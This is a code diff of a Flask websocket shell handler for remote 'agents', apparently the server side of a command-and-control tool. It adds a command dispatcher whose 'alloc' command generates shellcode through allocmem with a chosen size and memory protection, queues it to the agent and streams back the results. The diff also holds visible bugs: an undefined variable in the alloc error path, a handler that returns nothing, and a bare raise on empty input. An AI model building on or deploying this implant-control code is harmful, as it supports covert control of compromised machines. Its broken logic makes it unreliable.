@@ -1,46 +1,123 @@
 import logging
-
+from services.binary import allocmem
+from models.request import Request
+from models.response import Response
 logger = logging.getLogger(__name__)
 
 
 def _shell_ws_agent(ws, agent, identity):
+    import shlex
     import threading
     import time
 
     from flask import current_app
-    from models import db
-    from models.line import Line
 
     logger.info(f"Starting shell for agent {agent.id} and user {identity}.")
 
     app = current_app._get_current_object()
     stop_event = threading.Event()
 
-    def poll_incoming():
+    def normalize_to_bytes(data):
+        if isinstance(data, bytes):
+            return data
+        if isinstance(data, bytearray):
+            return bytes(data)
+        return str(data).encode("utf-8")
+
+    #
+    # Command handlers
+    #
+    def cmd_echo(*args):
+        
+
+        return args
+
+    def cmd_ping(*args):
+        return "PING"
+
+    def cmd_whoami(*args):
+        return f"user={identity} agent={agent.id}"
+    
+    def cmd_alloc(*args):
+        if len(args) != 2:
+            return "[error] alloc requires two hex arguments (size, protection)"
+        try:
+            size = int(args[0], 16)
+            protection = int(args[1], 16)
+        except ValueError:
+            raise ValueError(f"Invalid hex string: {value}")
+        shellcode = allocmem(agent.id, size, protection)
+        req_obj = Request(agent.id, shellcode)
+        req_obj.save()
+        response_obj = Response(agent.id, req_obj.response, req_obj.id)
+        response_obj.save()
+        return 
+
+    COMMANDS = {
+        "echo": cmd_echo,
+        "ping": cmd_ping,
+        "whoami": cmd_whoami,
+        "alloc": cmd_alloc,
+    }
+
+    def dispatch_command(text):
+        try:
+            parts = shlex.split(text)
+        except ValueError as e:
+            return f"[error] parse error: {e}"
+
+        if not parts:
+            raise Exception
+
+        command = parts[0]
+        args = parts[1:]
+        print(f"Arguments = {args}")
+
+        handler = COMMANDS.get(command)
+        if handler is None:
+            return f"[error] unknown command: {command}"
+
+        try:
+            return handler(*args)
+        except TypeError as e:
+            return f"[error] invalid arguments for {command}: {e}"
+        except Exception as e:
+            logger.exception("Command handler failed for %s", command)
+            return f"[error] command failed: {e}"
+
+    def poll_incoming_responses():
         last_seen_id = 0
 
         with app.app_context():
             while not stop_event.is_set():
                 try:
-                    lines = Line.by_agent_incoming_after(agent.id, last_seen_id)
-                    for line in lines:
-                        last_seen_id = line.id
-                        try:
-                            ws.send(line.content)
-                        except Exception:
-                            stop_event.set()
-                            break
+                    response_obj = Response.by_agent(agent.id)
+
+                    if response_obj is not None:
+                        # Avoid resending the same response if by_agent() returns the same row repeatedly
+                        if getattr(response_obj, "id", None) != last_seen_id:
+                            last_seen_id = getattr(response_obj, "id", 0)
+
+                            content = getattr(response_obj, "content", b"")
+                            if isinstance(content, bytes):
+                                try:
+                                    ws.send(content.decode("utf-8", errors="replace"))
+                                except Exception:
+                                    ws.send(str(content))
+                            else:
+                                ws.send(str(content))
 
                     time.sleep(1)
+
                 except Exception as e:
-                    logger.exception("Polling failed for shell %s", agent.id)
+                    logger.exception("Polling failed for agent %s", agent.id)
                     try:
                         ws.send(f"[error] polling failed: {e}")
                     except Exception:
                         pass
                     stop_event.set()
 
-    poll_thread = threading.Thread(target=poll_incoming, daemon=True)
+    poll_thread = threading.Thread(target=poll_incoming_responses, daemon=True)
     poll_thread.start()
 
     try:
@@ -68,11 +145,12 @@ def _shell_ws_agent(ws, agent, identity):
                 continue
 
             with app.app_context():
-                Line.create_for_agent(
-                    agent_id=agent.id,
-                    content=text,
-                    incoming=False
-                )
+
+                # Parse command -> call function -> create request
+                request_message = dispatch_command(text)
+                if request_message is None:
+                    continue
+                ws.send(request_message)
 
     finally:
         stop_event.set()
